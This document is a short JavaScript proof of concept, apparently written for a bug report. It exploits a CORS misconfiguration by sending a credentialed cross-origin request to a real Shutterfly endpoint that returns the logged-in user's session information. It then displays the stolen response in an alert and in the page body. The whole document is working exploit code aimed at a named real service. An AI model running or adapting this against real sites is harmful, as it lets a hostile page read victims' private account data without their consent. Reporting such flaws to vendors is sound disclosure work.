function cors() {  
var xhttp = new XMLHttpRequest();  
xhttp.onreadystatechange = function() {    
    if (this.status == 200) {    
    alert(this.responseText);     
    document.body.innerHTML = this.responseText;    
    }  
};  
xhttp.open("GET", "https://www.shutterfly.com/userXML/query.sfly?command=getSessionUserInfo", true);  
xhttp.withCredentials = true;  
xhttp.send();
}
cors();
